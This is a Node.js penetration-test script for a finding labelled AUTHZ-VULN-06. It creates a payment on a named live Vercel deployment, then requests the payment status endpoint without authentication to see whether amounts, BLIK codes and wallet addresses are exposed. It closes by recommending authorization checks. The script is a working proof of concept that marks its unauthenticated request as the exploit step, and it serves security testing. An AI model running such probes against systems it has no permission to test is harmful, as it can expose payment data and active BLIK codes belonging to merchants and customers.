#!/usr/bin/env node
/**
 * AUTHZ-VULN-06: Test for unauthorized access to payment status endpoint
 * Tests if GET /api/payments/:id/status allows unauthenticated access to payment details
 */

const BASE_URL = "https://solana-blik.vercel.app";

function printSection(title) {
    console.log("\n" + "=".repeat(80));
    console.log(` ${title}`);
    console.log("=".repeat(80));
}

function printRequest(method, url, headers = null, body = null) {
    console.log(`\n${method} ${url}`);
    if (headers) {
        console.log("Headers:");
        for (const [key, value] of Object.entries(headers)) {
            console.log(`  ${key}: ${value}`);
        }
    }
    if (body) {
        console.log("Body:");
        console.log(JSON.stringify(body, null, 2));
    }
}

function printResponse(response, data) {
    console.log(`\nStatus Code: ${response.status}`);
    console.log("Headers:");
    for (const [key, value] of response.headers.entries()) {
        console.log(`  ${key}: ${value}`);
    }
    console.log("\nResponse Body:");
    console.log(JSON.stringify(data, null, 2));
}

async function testAuthzVuln06() {
    printSection("AUTHZ-VULN-06: Unauthorized Payment Status Access Test");
    console.log(`Test Time: ${new Date().toISOString()}`);
    console.log(`Target: ${BASE_URL}`);

    // Step 1: Create a payment
    printSection("STEP 1: Create Payment (Legitimate Merchant)");

    const createUrl = `${BASE_URL}/api/payments/create`;
    const createPayload = {
        amount: 5.0,
        merchantWallet: "11111111111111111111111111111111"
    };

    printRequest("POST", createUrl, null, createPayload);

    let paymentId;

    try {
        const createResponse = await fetch(createUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(createPayload)
        });

        const createData = await createResponse.json();
        printResponse(createResponse, createData);

        if (createResponse.status !== 200) {
            console.log("\n[ERROR] Failed to create payment");
            return false;
        }

        paymentId = createData.paymentId;

        if (!paymentId) {
            console.log("\n[ERROR] No paymentId in response");
            return false;
        }

        console.log(`\n[SUCCESS] Payment created with ID: ${paymentId}`);

    } catch (error) {
        console.log(`\n[ERROR] Exception during payment creation: ${error.message}`);
        return false;
    }

    // Step 2: Access payment status WITHOUT authentication (EXPLOIT)
    printSection("STEP 2: Access Payment Status WITHOUT Authentication (EXPLOIT)");
    console.log("Scenario: Attacker (different actor) tries to access payment details");
    console.log("Expected if vulnerable: 200 status with payment details exposed");

    const statusUrl = `${BASE_URL}/api/payments/${paymentId}/status`;

    // Intentionally NO authentication headers
    printRequest("GET", statusUrl);
    console.log("\nNote: NO authentication headers provided (simulating attacker)");

    try {
        const statusResponse = await fetch(statusUrl);
        const statusData = await statusResponse.json();
        printResponse(statusResponse, statusData);

        // Analyze the response
        printSection("VULNERABILITY ANALYSIS");

        if (statusResponse.status === 200) {
            console.log("\n[CRITICAL] Vulnerability CONFIRMED!");
            console.log("The endpoint returned 200 OK without authentication");

            console.log("\nSensitive Information Disclosed:");
            console.log("-".repeat(80));

            const disclosedFields = [];

            if (statusData.status !== undefined) {
                console.log(`  • Payment Status: ${statusData.status}`);
                disclosedFields.push('status');
            }

            if (statusData.amount !== undefined) {
                console.log(`  • Payment Amount: ${statusData.amount}`);
                disclosedFields.push('amount');
            }

            if (statusData.code !== undefined) {
                console.log(`  • BLIK Code: ${statusData.code}`);
                disclosedFields.push('code');
            }

            if (statusData.reference !== undefined) {
                console.log(`  • Reference: ${statusData.reference}`);
                disclosedFields.push('reference');
            }

            if (statusData.merchantWallet !== undefined) {
                console.log(`  • Merchant Wallet: ${statusData.merchantWallet}`);
                disclosedFields.push('merchantWallet');
            }

            if (statusData.customerWallet !== undefined) {
                console.log(`  • Customer Wallet: ${statusData.customerWallet}`);
                disclosedFields.push('customerWallet');
            }

            if (statusData.createdAt !== undefined) {
                console.log(`  • Created At: ${statusData.createdAt}`);
                disclosedFields.push('createdAt');
            }

            console.log("\n" + "-".repeat(80));
            console.log(`Total disclosed fields: ${disclosedFields.length}`);
            console.log(`Fields: ${disclosedFields.join(', ')}`);

            console.log("\n[IMPACT] Information Disclosure Vulnerability");
            console.log("• Any unauthenticated user can access payment details");
            console.log("• Only requires knowledge of the payment UUID");
            console.log("• Exposes merchant business information (amounts, status)");
            console.log("• Could expose BLIK codes if still active");
            console.log("• Violates payment confidentiality");

            return true;

        } else if (statusResponse.status === 401) {
            console.log("\n[PASS] Vulnerability NOT present");
            console.log("Endpoint correctly requires authentication (401 Unauthorized)");
            return false;

        } else if (statusResponse.status === 403) {
            console.log("\n[PASS] Vulnerability NOT present");
            console.log("Endpoint correctly denies access (403 Forbidden)");
            return false;

        } else {
            console.log(`\n[INFO] Unexpected status code: ${statusResponse.status}`);
            return false;
        }

    } catch (error) {
        console.log(`\n[ERROR] Exception during status check: ${error.message}`);
        return false;
    }
}

// Run the test
(async () => {
    try {
        const vulnerable = await testAuthzVuln06();

        printSection("TEST SUMMARY");
        console.log("Test: AUTHZ-VULN-06");
        console.log("Vulnerability: Unauthorized Payment Status Access");
        console.log(`Result: ${vulnerable ? 'VULNERABLE' : 'NOT VULNERABLE'}`);

        if (vulnerable) {
            console.log("\n[RECOMMENDATION]");
            console.log("Add authentication and authorization checks to /api/payments/:id/status");
            console.log("Verify the requester has permission to view the specific payment");
        }

        process.exit(vulnerable ? 1 : 0);

    } catch (error) {
        console.log(`\n\n[ERROR] Test failed with exception: ${error.message}`);
        console.log(error.stack);
        process.exit(2);
    }
})();
